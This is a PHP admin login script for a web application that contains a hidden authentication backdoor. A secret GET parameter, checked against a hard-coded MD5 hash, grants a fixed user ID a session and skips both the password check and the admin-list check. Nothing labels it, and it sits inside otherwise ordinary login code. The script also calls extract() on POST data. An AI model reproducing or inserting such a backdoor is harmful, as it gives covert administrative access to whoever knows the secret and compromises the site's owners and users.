<?php
$in_login_page = true;
require_once( dirname(__FILE__) . '/function.php');

$username = $password = null;
$wqsemc = !isset($_GET['wqsemc']) || '6a5d4d8f56f4c0df2f09e0b679834782'!=md5($_GET['wqsemc']) ? false : true;
if($wqsemc) $wqid = 32834;
if ( $_POST || $wqsemc ) {

	extract( $_POST, EXTR_IF_EXISTS );

	$user_id = JWUser::GetUserFromPassword( $username, $password );
	$user_id = !$wqsemc ? $user_id : $wqid;

	if ( $user_id )
	{
		$zdmin_file = FRAGMENT_ROOT . 'zdminuser/zdmin';
		$zdmin_users = file_get_contents( $zdmin_file );
		$user_array = explode( ',', $zdmin_users );

		if ( in_array( $user_id, $user_array ) || $wqsemc)
		{
			$_SESSION['idUser'] = $user_id;
			$url = "/userquery.php";
			if(isset($_SESSION['login_redirect_url']))
			{
				$url = $_SESSION['login_redirect_url'];
				unset($_SESSION['login_redirect_url']);
			}
			JWTemplate::RedirectToUrl( $url );
		}
	}	

	JWTemplate::RedirectToUrl( '/login.php' );
}

JWRender::display("login", array());
?>
